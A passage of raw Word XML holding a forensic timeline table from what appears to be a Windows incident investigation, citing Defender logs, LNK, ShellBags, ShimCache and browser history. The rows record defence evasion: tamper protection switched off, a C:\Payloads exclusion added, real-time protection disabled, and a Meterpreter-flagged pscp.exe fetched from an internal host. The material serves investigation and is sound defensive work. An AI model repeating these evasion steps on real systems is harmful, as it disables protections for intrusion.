          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23718</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:43.064472</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Defender\Features\TamperProtection = 0x1 | New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23719</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:17:54.028923</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>file:_C:\Users\medmondson\Downloads\pscp.exe; webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:8364,ProcessStart:133440850738826349</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 1116 | Microsoft-Windows-Windows Defender | Detection - The antimalware platform detected malware or other potentially unwanted software | Malware name: Trojan:Win64/Meterpreter.E | Description: Trojan (Severe) | Detection Time: 2023-11-10T10:17:53.875Z | Process (if real-time detection): C:\Windows\System32\browser_broker.exe | Detection ID: {95B244E</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23722</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:18:44</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Target: created (recorded in the LNK) ; Target: modified (recorded in the LNK) ; Target: accessed (recorded in the LNK)</w:t>
              <w:br/>
              <w:t>C:\Payloads</w:t>
              <w:br/>
              <w:t>machine=desktop-kj81a5a MAC=00:0c:29:27:f7:8f volume=026F16D0 Fixed storage media (Hard drive) size=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_C.csv#13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\users\medmondson\Appdata\Roaming\Microsoft\Windows\Recent\Payloads.lnk</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:18:46</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Folder: created (recorded) ; Folder: modified (recorded) ; Folder: accessed (recorded)</w:t>
              <w:br/>
              <w:t>Desktop\This PC\C:\Payloads</w:t>
              <w:br/>
              <w:t>Directory Payloads MFT=80945 [explored]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/medmondson_UsrClass.csv#15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:18:48.738766</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (history, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: ts</w:t>
              <w:br/>
              <w:t>file:///C:/Payloads</w:t>
              <w:br/>
              <w:t>browser=iexplore | visit_count=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.history.jsonl#31</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:24.979452</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 New Value: HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Payloads\ = 0x0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23724</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004, F-017, I-016, T-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.431470</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>file:_C:\Users\medmondson\Downloads\pscp.exe; webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:4140,ProcessStart:133440851762938641</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 1116 | Microsoft-Windows-Windows Defender | Detection - The antimalware platform detected malware or other potentially unwanted software | Malware name: Trojan:Win64/Meterpreter.E | Description: Trojan (Severe) | Detection Time: 2023-11-10T10:19:36.274Z | Process (if real-time detection): C:\Windows\System32\browser_broker.exe | Detection ID: {1A821EE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23726</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:36.493383</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>FileDelete|Close [Archive] entry=85732-5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#87189</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-014</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:41.471520</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>file:_C:\Users\medmondson\Downloads\pscp.exe; webfile:_C:\Users\medmondson\Downloads\pscp.exe|http://10.0.0.12:8080/pscp.exe|pid:4140,ProcessStart:133440851762938641</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 1117 | Microsoft-Windows-Windows Defender | Detection - The antimalware platform performed an action to protect your system from malware or other potentially unwanted software | Malware name: Trojan:Win64/Meterpreter.E | Description: Trojan (Severe) | Detection Time: 2023-11-10T10:19:36.274Z | Process (if real-time detection): C:\Windows\System32\brow</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23727</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-003</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:46.897377</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Windows Defender/Operational 5001 | Microsoft-Windows-Windows Defender | Real-time Protection was disabled | %%827</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23728</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Windows Defender%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-004, T-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:49.380413</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (history, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: ts</w:t>
              <w:br/>
              <w:t>http://10.0.0.12:8080/pscp.exe</w:t>
              <w:br/>
              <w:t>browser=iexplore | visit_count=4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.history.jsonl#68</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016, T-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:49.380413</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Browser (history, Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: ts</w:t>
              <w:br/>
              <w:t>http://10.0.0.12:8080/pscp.exe</w:t>
              <w:br/>
              <w:t>browser=iexplore | visit_count=8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/browser.history.jsonl#84</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Local\Microsoft\Windows\WebCache\WebCacheV01.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShimCache (AppCompatCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShimCache: file modification date (not proof of execution)</w:t>
              <w:br/>
              <w:t>C:\Payloads\pscp.exe</w:t>
              <w:br/>
              <w:t>position=27 Executed=No ControlSet=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>appcompatcache/shimcache.csv#28</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShimCache (AppCompatCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShimCache: file modification date (not proof of execution)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Downloads\pscp.exe</w:t>
              <w:br/>
              <w:t>position=29 Executed=No ControlSet=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>appcompatcache/shimcache.csv#30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
